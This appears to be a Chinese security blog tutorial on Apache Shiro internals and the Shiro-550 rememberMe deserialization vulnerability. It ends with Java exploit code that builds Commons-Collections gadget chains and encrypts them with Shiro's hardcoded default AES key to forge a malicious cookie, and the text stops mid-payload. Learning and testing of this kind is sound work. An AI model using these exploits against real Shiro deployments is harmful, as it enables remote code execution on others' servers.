#  Java 安全 | 从 Shiro 底层源码看 Shiro 漏洞 (下)   
原创 Heihu577  Heihu Share   2024-12-06 12:25  
  
# 前言  
  
本篇文章是 《Java 安全 | 从 Shiro 底层源码看 Shiro 漏洞 (上)》的后续部分, 由于篇幅问题, 故分为两部分, 请大家衔接阅读...  
  
《Java 安全 | 从 Shiro 底层源码看 Shiro 漏洞 (上)》：  
https://mp.weixin.qq.com/s/htLPgrr0394SA8fbaZ4t-g  
> 声明：文中涉及到的技术和工具，仅供学习使用，禁止从事任何非法活动，如因此造成的直接或间接损失，均由使用者自行承担责任。  
  
###### FilterChainResolver::PathMatchingFilterChainResolver  
  
代码再继续运行, 我们则会看到FilterChainResolver  
的身影:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQpmgHR1PQTSnhLyicUwW6bA0ibibZM1pdP4366bDSolgAd2sLPribb80jGA/640?wx_fmt=png&from=appmsg "")  
  
image-20241015091245433.png  
  
目前我们知道的是,PathMatchingFilterChainResolver  
只是将FilterChainManager  
设置进去了, 这里并没有调用其他方法, 随后丢给了new SpringShiroFilter  
, 目前我们还不知道PathMatchingFilterChainResolver  
具体是用来干嘛的, 先不管, 后面看程序是否调用到某个方法时, 我们再进行研究.  
###### new SpringShiroFilter  
  
最后就走到SpringShiroFilter  
这个构造函数了, 分别传递了WebSecurityManager  
以及FilterChainResolver  
, 下面我们看一下做了一些什么操作:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQngwEibdvpBsIo2Ll7vd8zM3goy6jlXpggL0lhb34ojLErLybXtNwa9w/640?wx_fmt=png&from=appmsg "")  
  
image-20241015092034089.png  
  
这个Filter最终设置了程序员定义的WebSecurityManager  
以及在createInstance()  
方法中生成的FilterChainResolver  
. 虽然目前我们还不知道FilterChainResolver  
做了什么.  
##### doFilterInternal 核心逻辑  
  
因为SpringShiroFilter  
是一个Filter  
, 并且实现了OncePerRequestFilter  
, 所以每次HTTP请求过来时, 会调用doFilterInternal  
方法, 现在我们看一下这个方法做了什么:  
###### 封装 request, response  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQPebQic9proKI80w8hlQzmF0KhhcvUIwm7ThrGaADXACs56pNrZvvXFg/640?wx_fmt=png&from=appmsg "")  
  
image-20241015094035233.png  
  
这里只是对 request, response 进行了简单的封装, 封装为ShiroHttpServletRequest, ShiroHttpServletResponse  
, 读到这里暂时还没有发现对这两种方法上有什么扩展, 暂时先不管. 不过这两个封装的类类图如下:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQvKxCiaC5UwgWrEEUgYVSQeTwBHKDy5ncZjRBdDiajDBoQibnicOv75SIlw/640?wx_fmt=png&from=appmsg "")  
  
image-20241015094622298.png  
  
可以看到, 都实现了HttpServletRequest, HttpServletResponse  
.  
###### createSubject::SubjectContext  
  
下面我们首先分析一下WebSubject.Builder  
方法做了什么事情:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQrEDcA67t7AwnQJut16VMibSbicTst51htvYzd7ia01qibTstcGAw1OYibOw/640?wx_fmt=png&from=appmsg "")  
  
image-20241015102851850.png  
  
我们可以看到的是,WebSubject.Builder  
这个类, 维护了subjectContext && securityManager  
,securityManager  
从刚开始我们已经介绍过了, 重点是这个SubjectContext  
.  
  
SubjectContext  
是一个大的Map, 这个Map中包含了SecurityManager, ShiroServletRequest, ShiroServletResponse  
, 它的关系图如下:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQkRl6a69pxbLH9ep4VOfdIlrFibcfPDic7ibne0W8icW5VFVedkftzElktQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241015103216265.png  
  
我们可以看到的是, 它将本次请求的request, response  
, 以及我们重要的securityManager  
进行封装了. 那么下面我们看一下WebSubject.Builder::buildWebSubject  
方法做了什么:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQACYXiakZw45IILJZgnhyEu7QuqRq3SgEMBd2ENGQ37YTBvM7ib3MdnhQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241015115047321.png  
  
可以看到的是, 当一次请求过来, 如果当前请求存在 SESSION, 那么会将当前的 SESSION 放入到 SubjectContext 这个 Map 中进行管理.  
  
我们可以清晰的感觉到, SubjectContext 中存储了当前 HTTP 请求的各种状态.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQNmuE2Rbgj3ibpvXeicqDmnG32icGhHLlicCTgwu0h7AxSdwSp5srVkiakvQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241015152147897.png  
  
这里我们可以看到, 首先判断SESSION, 如果SESSION中存在用户名信息, 那么就直接返回, 如果SESSION不存在, 或者SESSION中没有用户名信息, 那么就会通过RememberMe  
组件进行反序列化得到当前用户信息, 这里存在一个Shiro550的一个漏洞, 先留下悬念, 漏洞后面我们再分析.  
  
通过这几行代码, 我们可以清楚的感受到, SubjectContext 这个 Map 中存放着当前 HTTP 请求中的所有状态, 以及我们的 SecurityManager.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQvzmx9NLib5mtsEgZwmsjpBKLUT3icr0y0Fsicca1GVicqr0poYgYQjaTdg/640?wx_fmt=png&from=appmsg "")  
  
image-20241015153342817.png  
  
下面 save 方法仅仅只是对 subject 进行校验, 在这里就不再说明了, 因为整个createSubject  
方法是对subject  
的处理. subject 中包含了当前状态的信息, 知道这些, 已经足够了.  
###### subject.execute  
  
WebDelegatingSubject, 是 createSubject 的返回结果, 那么我们看一下该类图:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQnmp001u5MVRDd7a5zwfRNbDp8oSsgyGxicacPFBANJ5mcUAoYYmhmvQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241015154557818.png  
  
那么我们接着看代码:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQgg2YxrKz6euZMvWRXg2ktiaqXooPGzCzibCFKuCaDpRb4QGicaA8LiaO1w/640?wx_fmt=png&from=appmsg "")  
  
image-20241015160718771.png  
  
可以看到,SubjectCallable  
类似于一个代理类, 它将外部的  
```
new Callable() {    public Object call() throws Exception {        updateSessionLastAccessTime(request, response);        executeChain(request, response, chain);        return null;    }}
```  
  
封装到自己的callable属性  
中, 将WebDelegatingSubject  
封装为了SubjectThreadState  
. 因为subject.execute  
会执行SubjectCallable::call  
方法, 那么我们跟进:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQkXt2Ns1jgKTlHbrkCgx3ZLblibOENibia9GXbVM2g6F0qyg7piaaASJibIg/640?wx_fmt=png&from=appmsg "")  
  
image-20241015163857050.png  
  
可以看到的是, 这一系列代码做了两件事:  
- 将当前 WebDelegatingSubject 对象与线程绑定在一起  
  
- 获取当前URI, 与 FilterChainManager 中的 URI 进行逐步匹配, 匹配成功后会调用filterChainManager.proxy(originalChain,当前URI)  
方法.  
  
那么我们看一下匹配成功后做了什么事情:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQzia0IndEWib1jWKm3p49KrrvKkkAkeYoiag09psCKCEDZFBNS3d4CGPmw/640?wx_fmt=png&from=appmsg "")  
  
image-20241015172956205.png  
  
假设匹配到的 Filter 为:SimpleNamedFilterList[AnonymouseFilter, UserFilter]  
.  
  
匹配成功后, 将SimpleNamedFilterList  
交给ProxiedFilterChain  
, 随后ProxiedFilterChain  
调用AnonymouseFilter::onPreHandle  
方法, 执行完毕后, 接着调用UserFilter::onPreHandle  
, 当SimpleNamedFilterList  
遍历完毕后, 运行结束.  
  
从这里我们可以看到,Shiro  
中自带的Filter  
, 核心逻辑是重定义onPreHandle | preHandle  
方法, 下面看一下一些Filter  
的onPreHandle  
方法是怎么定义的:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQM1Or7MGdnFMBJDbrCQPSiavxZpUGCibJ5Rb2TGauIyJCnIaU55icUB9tQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241015174027102.png  
  
可以看到AnonymousFilter  
作为anon  
的代名词, 只要配置了anon  
并访问具体路由, 就会调用到AnonymousFilter::onPreHandle  
方法, 任何用户都可以直接访问, 是因为这里直接返回了 true.  
  
而LogoutFilter  
作为logout  
的代名词, 只要配置了logout  
并访问具体路由, 就会调用到LogoutFilter::preHandle  
方法, 直接调用了subject.logout()  
方法进行清空当前状态.  
  
而UserFilter  
的定义比较复杂, 它的onPreHandle  
是在父类上, 其定义如下:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQliaDt37Eke9rqfbx2W0Pgllwv64FVO15HjhTH9GBjRoaj1mlIR8NgmQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241015174521008.png  
  
这里的一些其他逻辑, 我们在做测试的时候可以细看, 至此, 整个 Shiro 框架运行核心原理已清楚!  
### SpringMVC 环境搭建  
  
由于我们上面的环境是配置在SpringBoot  
上的, 我们阅读底层源码的时候, 因为SpringBoot  
有FilterRegistrationBean && 自动扫描 Filter  
机制, 所以我们在SpringBoot  
中, 只要稍微配置一下ShiroFilterFacotryBean  
即可直接使用ShiroFilter  
, 而在 SpringMVC 环境中, 是不存在FilterRegistrationBean  
的.  
  
这一部分知识点不只是开发的, 包括我们在打Shiro  
反序列化漏洞的时候, SpringMVC 环境 与 SpringBoot 环境也大有不同, 经过思考, 将 SpringMVC 环境下的配置核心原理, 也写出来.  
  
注意使用 IDEA 创建项目时, 选择Maven ArcheType  
, 引入所需要的扩展:  
```
<dependencies>    <dependency> <!-- 引入 junit, 可以进行测试包 -->        <groupId>junit</groupId>        <artifactId>junit</artifactId>        <version>4.11</version>        <scope>test</scope>    </dependency>    <dependency> <!-- 引入 springMVC -->        <groupId>org.springframework</groupId>        <artifactId>spring-webmvc</artifactId>        <version>5.3.8</version>    </dependency>    <dependency> <!-- 支持切面编程 -->        <groupId>org.springframework</groupId>        <artifactId>spring-aspects</artifactId>        <version>5.3.8</version>    </dependency>    <dependency> <!-- 引入 servlet-api -->        <groupId>javax.servlet</groupId>        <artifactId>javax.servlet-api</artifactId>        <version>3.1.0</version>    </dependency>    <dependency> <!-- 引入 shiro-spring -->        <groupId>org.apache.shiro</groupId>        <artifactId>shiro-spring</artifactId>        <version>1.2.3</version>    </dependency>    <dependency>        <groupId>commons-collections</groupId>        <artifactId>commons-collections</artifactId> <!-- 引入 commons-collections 链 -->        <version>3.2.1</version>    </dependency>    <!-- 添加Tomcat依赖, 对应到自己的版本号 -->    <dependency>        <groupId>org.apache.tomcat.embed</groupId>        <artifactId>tomcat-embed-core</artifactId>        <version>8.5.100</version>        <scope>provided</scope>    </dependency>    <dependency>        <groupId>org.apache.tomcat</groupId>        <artifactId>tomcat-servlet-api</artifactId>        <version>8.5.100</version>        <scope>provided</scope>    </dependency>    <!-- 如果你需要使用Jasper for JSP support -->    <dependency>        <groupId>org.apache.tomcat</groupId>        <artifactId>tomcat-jasper</artifactId>        <version>8.5.100</version>        <scope>provided</scope>    </dependency></dependencies>
```  
  
随后我们在Maven  
项目中, 添加对Tomcat  
的支持, 这个步骤就不再重复了, 熟悉 IDEA 的都懂. 接下来我们一步一步配置Shiro  
的环境.  
  
在/WEB-INF/web.xml  
中创建如下内容:  
```
<filter>    <filter-name>shiroFilter</filter-name> <!-- filter-name 写 shiro bean 的名称 -->    <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>    <init-param>        <param-name>targetFilterLifecycle</param-name>        <param-value>true</param-value>    </init-param></filter><filter-mapping>    <filter-name>shiroFilter</filter-name>    <url-pattern>/*</url-pattern></filter-mapping><servlet>    <servlet-name>dispatcherServlet</servlet-name>    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>    <init-param>        <param-name>contextConfigLocation</param-name>        <param-value>classpath:ApplicationContext.xml</param-value>    </init-param>    <load-on-startup>1</load-on-startup></servlet><servlet-mapping>    <servlet-name>dispatcherServlet</servlet-name>    <url-pattern>/</url-pattern></servlet-mapping>
```  
  
可以看到, 这里我们使用DelegatingFilterProxy  
进行配置我们shiroFilter  
, 创建resources/ApplicationContext.xml  
文件内容如下:  
```
<context:component-scan base-package="com.heihu577"/> <!-- 扫描 Bean --><bean class="org.springframework.web.servlet.view.InternalResourceViewResolver">    <property name="prefix" value="/WEB-INF/pages/"/> <!-- 配置视图解析器, 当然了, 这里需要在 web/WEB-INF/ 下创建 pages 目录 -->    <property name="suffix" value=".jsp"/></bean><bean id="defaultWebSecurityManager" class="org.apache.shiro.web.mgt.DefaultWebSecurityManager">    <property name="rememberMeManager"> <!-- 准备 rememberMeManager -->        <bean class="org.apache.shiro.web.mgt.CookieRememberMeManager">            <property name="cookie">                <bean class="org.apache.shiro.web.servlet.SimpleCookie">                    <property name="name" value="rememberMe"/> <!-- 配置 Cookie 名称 -->                    <property name="maxAge" value="60"/> <!-- Cookie 存活时长 -->                </bean>            </property>        </bean>    </property>    <property name="realm"> <!-- 准备自定义 Realm, 账号任意, 密码 heihu577 即可登录. -->        <bean class="com.heihu577.realm.MyRealm"/>    </property></bean><bean id="shiroFilter" class="org.apache.shiro.spring.web.ShiroFilterFactoryBean">    <property name="filterChainDefinitionMap">        <map>            <entry key="/index" value="user"/> <!-- 记住我访问 -->            <entry key="/login" value="anon"/> <!-- 任意用户访问 -->            <entry key="/user/login" value="anon"/> <!-- 任意用户访问 -->            <entry key="/**" value="authc"/> <!-- 已认证访问 -->        </map>    </property>    <property name="securityManager" ref="defaultWebSecurityManager"/> <!-- 定义 SecurityManager -->    <property name="loginUrl" value="/login"/> <!-- 定义登录页面 -->    <property name="unauthorizedUrl" value="/login"/> <!-- 定义未认证跳转页面 --></bean>
```  
  
定义MyRealm  
:  
```
public class MyRealm extends AuthorizingRealm {    @Override    public String getName() {        return "myRealm";    }    @Override    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) {        return null;    }    @Override    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException {        UsernamePasswordToken upToken = (UsernamePasswordToken) token;        String username = upToken.getUsername();        SimpleAuthenticationInfo simpleAuthenticationInfo = new SimpleAuthenticationInfo(username, "heihu577", getName());        return simpleAuthenticationInfo;    }}
```  
  
随后定义Controller  
:  
```
@Controllerpublic class PageController {    @RequestMapping("/index")    public String index() {        return "index";    }    @RequestMapping("/login")    public String login() {        return "login";    }}
```  
  
以及登录用的Controller  
:  
```
@Controller@RequestMapping("/user")public class UserController {    @RequestMapping("/login")    public String login(HttpServletRequest request, String username, String password,                        @RequestParam(defaultValue = "false", required = false) boolean rememberMe) {        UsernamePasswordToken usernamePasswordToken = new UsernamePasswordToken(username, password);        Subject subject = SecurityUtils.getSubject();        System.out.println(rememberMe);        usernamePasswordToken.setRememberMe(rememberMe);        try {            subject.login(usernamePasswordToken);            System.out.println("登陆成功!");            return "index"; // 登陆成功跳转            /* webapp/WEB-INF/pages/index.jsp 页面内容:             <%@ page contentType="text/html;charset=UTF-8" language="java" %>                <%@ taglib prefix="shiro" uri="http://shiro.apache.org/tags" %>                <html>                <head>                    <title>Title</title>                </head>                <body>                    <h3>Hello User: <shiro:principal/></h3>                </body>                </html>            */        } catch (Exception e) {            System.out.println("登陆失败!");            request.setAttribute("msg", "登陆失败!");            return "login"; // 登陆失败            /* webapp/WEB-INF/pages/login.jsp 页面内容:             <%@ page contentType="text/html;charset=UTF-8" language="java" isELIgnored="false" %>                <!DOCTYPE html>                <html lang="en">                <head>                    <meta charset="UTF-8">                    <title>用户登录</title>                    <base href="<%=request.getContextPath()%>/">                </head>                <body>                <form action="user/login" method="post"> <!-- 这里发送的控制器请求在 UserController 进行接收 -->                    u: <input type="text" name="username"><br>                    p: <input type="password" name="password"><br>                    rememberMe: <input type="radio" name="rememberMe"><br>                    <input value="登录" type="submit"><br>                    ${requestScope.msg}                </form>                </body>                </html>            */        }    }}
```  
  
那么我们就搭建了与上面SpringBoot  
环境"一模一样"的SpringMVC  
环境.  
#### DelegatingFilterProxy 核心逻辑  
  
与SpringBoot  
不同的是, 在SpringMVC  
中进行配置Shiro  
, 需要使用DelegatingFilterProxy  
进行支撑, 下面我们看一下为什么需要DelegatingFilterProxy  
. 首先我们看一下DelegatingFilterProxy  
的类图:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQkRlL4zpUOOzyIMas1McuICTl4UbQZLxSMW4R6UplAbZ3c37vJ6NZRA/640?wx_fmt=png&from=appmsg "")  
  
image-20241016155229522.png  
  
我们可以看到, 该类是一个Filter  
, 并且继承了GenericFilterBean  
类, 既然是Filter  
, 那么当我们配置该Filter  
后启动Tomcat  
容器, 就会调用Filter::init  
方法, 那么我们先看一下该方法做了什么.  
##### DelegatingFilterProxy::init  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQvfadaF3gegiaemQjUC5lpJ0xjp0rs3icDUuPWIbAzWoa3bVLyS5fFlQA/640?wx_fmt=png&from=appmsg "")  
  
image-20241016161956014.png  
  
可以看到的是, 由于Tomcat  
注册Filter  
在Spring  
容器初始化之前, 这里initFilterBean  
方法并无法对shiroFilter  
做初始化工作.  
  
但是这里BeanWrapper.setPropertyValues(pvs, true)  
, 会对targetFilterLifecycle  
做初始化工作, 由于代码底层是Spring的代码, 笔者这里就不贴图了, 最终会调用到DelegatingFilterProxy::setTargetFilterLifecycle  
, 进行初始化targetFilterLifecycle  
这个成员属性.  
  
而其他部分代码对filterConfig && targetBeanName  
成员属性进行初始化操作.  
  
我们就简单的理解该方法是用来保存filterConfig && targetBeanName && targetFilterLifecycle  
到自己的成员属性中的功能吧.  
  
那么我们分析一下DelegatingFilterProxy::doFilter  
方法.  
##### DelegatingFilterProxy::doFilter  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQTMlCH0fuqERDDBOLGqqnEsbWOSVrIE3vdiapKeib8K4YAPeso5yT7Zcg/640?wx_fmt=png&from=appmsg "")  
  
image-20241016165206638.png  
  
通过DelegatingFilterProxy::doFilter  
方法我们可以看到, 对 Spring 中是 Filter 的 Bean 进行调用 init 方法与 doFilter 方法.  
  
调用具体 Filter 的 init 方法的前提是, 配置了targetFilterLifecycle  
为true  
才会进行调用.  
## Shiro 漏洞分析  
### Shiro 550 条件: < 1.2.4  
  
Shiro 550  
是一个经典的反序列化漏洞, 它是由于RememberMe  
功能模块,AES加密  
使用了默认Key  
, 从而导致了黑客可以通过伪造Key  
进行反序列化任意值, 如果此时恰好存在RCE的反序列化链路, 那么黑客将可以使反序列化漏洞升级为RCE漏洞.  
#### 调用点回顾  
  
在我们前面分析Shiro  
底层机制时, 我们注意到, 当一次HTTP  
请求过来时, 会调用到SpringShiroFilter::doFilterInternal  
方法, 而这个方法中createSubject  
方法调用时, 会解析当前用户的状态, 链路如下:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQsMXF1sWUOhyyxIOT5oagPKbRcCoOj4MzqeXBnUFKNhYjDialTZxNBWw/640?wx_fmt=png&from=appmsg "")  
  
image-20241016171814327.png  
#### 反序列化点分析  
  
那么我们重点关注getRememberedPrincipals  
方法:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQnSp9iaXtZtgQU2mM4ZvHw68S1A7xgknKrmbKuLUSIrzS0ZPRIw8LY7A/640?wx_fmt=png&from=appmsg "")  
  
image-20241016185153148.png  
  
我们可以看到, 该代码段做了如下事情.  
- 拿到Cookie  
中的rememberMe  
的值  
  
- 对rememberMe  
进行Base64  
解码操作  
  
- 使用AES处理器  
对Base64解码后的值  
进行AES解码  
操作  
  
- 将最终解码后的值使用反序列化处理  
  
#### 漏洞产生原理  
  
乍一看逻辑没什么问题, 但问题是AesCipherService  
使用的KEY, 是程序中已写死的KEY, 如图:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQKnyAT1wicVn5QvFQKSHNaG4V84VTMFRBlFD9iaXXBvdzKpnXA5hUT0ibA/640?wx_fmt=png&from=appmsg "")  
  
image-20241016190248236.png  
  
那么黑客可以通过如下操作:  
- 使用该Key  
对恶意序列化值  
进行AES  
加密处理.  
  
- 将该AES  
值进行Base64  
编码操作  
  
- 将该Base64值  
放入到rememberMe  
这个Cookie  
中  
  
这样程序将进行反序列化黑客所指定的恶意序列化值. 从而引发反序列化漏洞.  
##### 漏洞复现 - SpringBoot - CC 链  
  
我们可以编写如下EXP, 生成恶意Cookie  
值.  
```
public class MyExp01 {    public static void main(String[] args) throws Exception {        AesCipherService aesCipherService = new AesCipherService(); // 创建 AES 加密器.        TemplatesImpl templates = new TemplatesImpl();        Field bytecodes = templates.getClass().getDeclaredField("_bytecodes");        Field name = templates.getClass().getDeclaredField("_name");        name.setAccessible(true);        bytecodes.setAccessible(true);        byte[][] myBytes = new byte[1][];        myBytes[0] = new BASE64Decoder().decodeBuffer("恶意类的 Base64 值"); // 这个恶意类必须继承`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`抽象类, 之前有分析过, 就不提及了.        bytecodes.set(templates, myBytes);        name.set(templates, "");        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})        });        HashMap<Object, Object> map = new HashMap<>();        LazyMap lazyMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);        TiedMapEntry tiedMapEntry = new TiedMapEntry(new HashMap(), "heihu577");        HashMap<TiedMapEntry, Object> hsMap = new HashMap<>();        hsMap.put(tiedMapEntry, null);        Field lazyMapDst = tiedMapEntry.getClass().getDeclaredField("map");        lazyMapDst.setAccessible(true);        lazyMapDst.set(tiedMapEntry, lazyMap);        // 如上已准备好 CC 链        ByteArrayOutputStream bos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(bos);        oos.writeObject(hsMap);        byte[] escapeData = bos.toByteArray();        // 如上已准备好序列化后的值        ByteSource encrypt = aesCipherService.encrypt(escapeData, Base64.decode("kPH+bIxk5D2deZiIxcaaaA=="));        System.out.println(encrypt.toBase64()); // 准备 Base64 值    }}
```  
  
生成Base64  
值后, 放到浏览器rememberMe  
Cookie中, 把SESSION  
去掉, 访问即可触发EXP:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQdicdabesPPV3JW5edMxbrNz2mX4T4D0fWoDgA6q2zicJfqIbl4tr7A9Q/640?wx_fmt=png&from=appmsg "")  
  
image-20241016192039806.png  
##### 漏洞复现 - SpringMVC - CC 链  
  
上述 Payload 可以在SpringBoot  
中复现, 但是当我们切换到SpringMVC  
中, 无法弹出计算器. 跟进 DEBUG 看一下情况:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQ92qiccxZla7fdVg8kSjH0Rg6XTKc0SXq3O099RJbAMp1Jfe19Bibqhbw/640?wx_fmt=png&from=appmsg "")  
  
image-20241016193724879.png  
  
可以发现, 爆出了ClassNotFound  
错误, 那么报错的原因是什么呢？  
###### CC 链失败原因  
  
上面我们可以看到, 失效了, 原因则是, 这里并不是使用的原生的ObjectInputStream  
, 而是使用了自己编写的ClassResolvingObjectInputStream  
来进行readObject  
操作, 我们可以看一下该类是如何定义的:  
```
public class ClassResolvingObjectInputStream extends ObjectInputStream {    public ClassResolvingObjectInputStream(InputStream inputStream) throws IOException {        super(inputStream);    }    @Override    protected Class<?> resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {        try {            return ClassUtils.forName(osc.getName()); // 注意这里        } catch (UnknownClassException e) {            throw new ClassNotFoundException("Unable to load ObjectStreamClass [" + osc + "]: ", e);        }    }}
```  
  
这里重写了resolveClass  
方法, 也就意味着加载类时, 会进入该方法的逻辑. 而对于原生的ObjectInputStream::resolveClass  
方法定义是这样的:  
```
protected Class<?> resolveClass(ObjectStreamClass desc)    throws IOException, ClassNotFoundException{    String name = desc.getName();    try {        return Class.forName(name, false, latestUserDefinedLoader()); // 使用 Class.forName 进行加载类    } catch (ClassNotFoundException ex) {        Class<?> cl = primClasses.get(name);        if (cl != null) {            return cl;        } else {            throw ex;        }    }}
```  
  
这两种方式有什么区别吗？我们看一下ClassResolvingObjectInputStream::resolveClass  
做了什么事情:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQoTwGWtNYNpzWNgbic2Q4iaWwiar75ibWyNnzgb26boXoQqvkwnnhYicYzeA/640?wx_fmt=png&from=appmsg "")  
  
image-20241016195411426.png  
  
可以看到,ClassLoader.loadClass  
在加载数组时都会报错. 而Class.forName  
则不会, 如下:  
```
String className = "[I";Class<?> clazz01 = Class.forName(className);System.out.println(clazz01); // Class.forName 允许加载数组, class [IClass<?> clazz02 = ClassLoader.getSystemClassLoader().loadClass(className); // ClassLoader 不允许加载数组, 这里直接报错
```  
  
而因为我们的链路中, 是存在数组的, 所以使用classLoader  
来进行加载链路时, 会抛出异常. 所以这里我们的链路中是不能存在数组的.  
###### 无数组 CC 链  
  
这方面也比较简单, 直接运用学过的CC1~7  
中的一条无数组链就可以, 而由于CC链  
版本限制, 我们不能使用TransformingComparator::compare  
这个链, 因为低版本的CC中TransformingComparator  
是不允许序列化的.  
  
那么我们就需要自己组合出来一个无数组的CC链, 思路如下:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQ7AKwia4qz9fjXzYZiaFJVh4ibaRiaN7sj3W4WNKh3QvI8yn2RKATvvTOEA/640?wx_fmt=png&from=appmsg "")  
  
image-20241016212219030.png  
  
那么构造如下POC:  
```
public class Exp01 {    public static void main(String[] args) throws Exception {        TemplatesImpl templates = new TemplatesImpl();        Field bytecodes = templates.getClass().getDeclaredField("_bytecodes"); // 最终调用到 defineClass 方法中加载类字节码        Field name = templates.getClass().getDeclaredField("_name"); // 放置任意值        name.setAccessible(true);        bytecodes.setAccessible(true);        byte[][] myBytes = new byte[1][];        myBytes[0] = new BASE64Decoder().decodeBuffer("yv66vgAAADQAZgoAEQAzCgA0ADUHADYKADcAOAoAOQA6CgA7ADwJAD0APgcAPwoACABACgBBAEIKAEMARAgARQoAQwBGBwBHBwBICgAPAEkHAEoBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEACUxjb20vQ01EOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAZlbmNvZGUBAAJbQgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwBLAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwBHAQAKU291cmNlRmlsZQEACENNRC5qYXZhDAASABMHAEwMAE0AUAEAB2NvbS9DTUQHAFEMAFIAUwcAVAwAVQBWBw